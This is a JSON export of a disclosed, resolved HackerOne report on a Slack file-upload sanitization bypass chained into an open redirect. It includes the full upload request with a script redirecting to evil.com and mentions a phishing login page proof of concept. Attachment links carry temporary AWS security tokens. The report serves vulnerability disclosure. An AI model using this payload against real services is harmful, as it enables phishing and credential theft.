@@ -1,0 +1,169 @@
+{
+  "id": 140447,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDA0NDc=",
+  "url": "https://hackerone.com/reports/140447",
+  "title": "Open Redirect on slack.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-23T10:08:15.137Z",
+  "submitted_at": "2016-05-23T10:08:15.137Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sudotop",
+    "url": "/sudotop",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/456/3908e8018cc635e42b7de3db356b844bcdbc3448_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-10-02T18:09:42.737Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-09-02T18:09:37.498Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, my report has tow interesting parts here\nFirst\n======\nIn this report #104087 the attacker uploads a svg file to execute JavaScript and redirect to any domain\nI have found a new way to execute full html files on victim machine instead of downloading them by adding a bunch of binary chars before html code\n\n### Please have a look at screenshots attached here to get what I mean.\n### Steps\n1. login to your account and send the following request:\n\nNote: I can't get binary chars displayed here so I attached a file containing the whole request\n\n```\nPOST /api/files.uploadAsync HTTP/1.1\nHost: upload.slack.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Length: 886\nContent-Type: multipart/form-data; boundary=---------------------------89481407720596\nOrigin: https://<subdomain>.slack.com\nConnection: keep-alive\n\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"file\"; filename=\"pixel.png\"\nContent-Type: text/html\n\n<bunch_of_binary_chars_here>\n<html>\n<script>\nwindow.location='http://www.evil.com';\n</script>\n</html>\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"filename\"\n\npixel\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"token\"\n\n<token>\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"channels\"\n\n<channels>\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"title\"\n\npixel\n-----------------------------89481407720596\nContent-Disposition: form-data; name=\"initial_comment\"\n\nhi\n-----------------------------89481407720596--\n\n```\n\n2. Make public link for \"pixel\" file \"https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee\"\n\n3. Complete link \"https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee\"\n\n4. Whenever a victim clicks the previous link he will get to \"http://www.evil.com\"\n\nSecond\n======\nI have found another way to make the redirect link very simple and more tricky\nThe attacker can just use slack main domain using this link \"https://slack.com/files-pri/T1ARLSGBS-F1AU0FTGR/pixel?pub_secret=094ca97aee\" to redirect victims to \"http://www.evil.com\".\n\nThere are many other attack scenarios can be achieved here cause the attacker has full control over file content and name also.\n\nHere is a simple phishing login page I have created as PoC that could trick even advanced users to submit their credentials to the attacker \"https://slack.com/files-pri/T1ARLSGBS-F1AVC33M5/login?pub_secret=e80f120635\" \n\nAttacker could do tons of fun stuff to the files, to my mind come Viruses, Exploits, Illegal Content, etc.",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 95292,
+      "file_name": "slack.com_URL_Redirect.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/095/292/8b8058f5fe7bd179e0835703fd18bb5cd77cc8f8/slack.com_URL_Redirect.png?response-content-disposition=attachment%3B%20filename%3D%22slack.com_URL_Redirect.png%22%3B%20filename%2A%3DUTF-8%27%27slack.com_URL_Redirect.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121143Z&X-Amz-Expires=2229&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=aa3103e31a6ec2222188f2a9afe784d4bbc83a195ffbd0f83a11796bbc8ce067",
+      "file_size": 141060,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 95293,
+      "file_name": "slack.com_phishing_login_page.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/095/293/c7a5603b43dd30bb22e7dea1cf6e155f16a27967/slack.com_phishing_login_page.png?response-content-disposition=attachment%3B%20filename%3D%22slack.com_phishing_login_page.png%22%3B%20filename%2A%3DUTF-8%27%27slack.com_phishing_login_page.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121143Z&X-Amz-Expires=2229&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4c464937070725be95e58deb5bee43e386509dff4d538836be03641ff4e5930c",
+      "file_size": 161985,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 95294,
+      "file_name": "Slack_HTML_POST.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/095/294/22427be748bf9c76a15f2f6463f08d8efc2b6343/Slack_HTML_POST.png?response-content-disposition=attachment%3B%20filename%3D%22Slack_HTML_POST.png%22%3B%20filename%2A%3DUTF-8%27%27Slack_HTML_POST.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121143Z&X-Amz-Expires=2229&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5cfcfce438d08517791cb95d8fe5368a827c7ad6f68f877e3656ff03ad8b4c55",
+      "file_size": 80548,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 95295,
+      "file_name": "request.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/095/295/a7f4763db2bd38e22db6f10d7f8254e4c663c92b/request.txt?response-content-disposition=attachment%3B%20filename%3D%22request.txt%22%3B%20filename%2A%3DUTF-8%27%27request.txt&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTF44ZAEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121143Z&X-Amz-Expires=2229&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFEl8GqbU4%2BAZWXm076AaH%2B3S407ekrwvRLdQXFj8maSAiEA7oNJs0dICVPaCtN3NpIrAoDbQV6Ejyi77KrlQuPRpBUqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNahsKqUdewADnORUCqPBbSt2LFuIdf7dnF6%2BSGZ9cPoiAZQMWLALN%2BWYyomEtoEWkOWvMa3f%2FvHfanqxv8y5APokVYlWhRKSi8EMnvvYlLkZCoZfEBYxrita%2BGJmOnAfLzKbAP4Y1yam8eHRyWd6gZv7A4xifGB4%2ByVBYpUwFfY%2FtSjbc%2FADNbGz8H5boNvsNv97iDrtAsWuhS%2BTsE9HMWty2Q5Kps5ZGh719NET5yzc4Q%2FtQXq6VZEsGmZJkhBk53ZbFfobOPyei9pZmZ6%2F2Mdq5510O22TvjtOWihXdrUVF18IGjoWAOzpmqJcFgY3pqd5Ptl8Jdv66jxrsyfzyou5wCExfQr5qzH9Vpmay4uCPhR%2FSyOG0CWwOh8b8NbDwQiT7n2e8mRdgfAZzQDYWZ3kDf3xJl4T%2BjizpvEyF4k8cnRHigJ9psCKck22rc%2FdJIeRzDPuK5gMydq%2BbZEiPRUgdLry1vf%2FHAVYzhqB51d5Ia44hsUeGvDrXu3hn5jGoJVb3p%2Bu8LXRAkstmLBEwTwx74%2BZLrtaIUbsPvoibM71bPShjn%2BeifHzFDMz1pzYAEKS3bKR%2BF6mAsb4TJcHb1aEgl%2F2VZr38huYt8TwDwXCn28i8e7UPTktLQ2%2BMY1xUbNU3qxurYTVuFskexXKmi%2BnALorE9k8A7GDdADBu%2BosuLTO%2FnUPwqP7dZYKwg749EtuHvA2OFyp16mblUz6KrLb%2FfAf3TLzS6zHIe9WcnoK0psjQn6DQdUv66ZNqunDkraEzFI7GUBVlDXzoFJMpTnm5cbS7icJeTI6SUbCamKJgZz1LYzEzm33%2FlZTz%2BFyEGL8HyorVpd5vY4dHVbb%2FeMQNELRsc2s1ONbdE6YfwyrhFyYvYBiYx9Ye%2F4ssowjpisrgY6sQFmStbg5zGr%2B68rMwEIJwcr9jwJvywdn4oxOR6RXInAJwN7lgch%2FvzVf1lSeRFZ6LuihOe%2FS4iwHxeNi0t9Xh3zgBPmKv%2FWlXb8g%2B6ZDByHn%2FH6haAptR1xW4BXNpTl7xRg1NW7b9aUxDCrRqOG%2Fy%2Bh2qYMDczVX6rGrxtEquYnaLpzcZzZ9hdZysgVk1A1SxT6%2Bkfp2tIiSadsRwSyKAYEPliJeaGXm3nwn7sIZmazF5Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=00a62f1e692a83568f659c8399535e29557e21bb3178f4509ea5b1306af28ff9",
+      "file_size": 1289,
+      "type": "application/octet-stream",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-10-02T18:09:37.602Z",
+  "allow_singular_disclosure_after": -232394525.86254779,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "haqpl",
+    "spam404",
+    "zombiehelp54",
+    "vijay_kumar",
+    "malcolmx",
+    "0xradi",
+    "ehsahil",
+    "jens",
+    "spetr0x",
+    "akshay_raj",
+    "and 1 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 2569,
+      "category": "team",
+      "content": "@sudotop discovered a bypass of our sanitization on slack-files.com, which could be combined with a particular file-sharing link from the slack domain to lead to an open redirect. Slack has mitigated this bypass. Thanks @sudotop!",
+      "user": {
+        "id": 16613,
+        "username": "maxfeldman",
+        "name": "Max Feldman",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "",
+        "location": "",
+        "created_at": "2015-01-22T21:37:19.754Z",
+        "url": "https://hackerone.com/maxfeldman",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/016/613/37b54dbac5da0a42db471713959c8bf2de89a12d_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
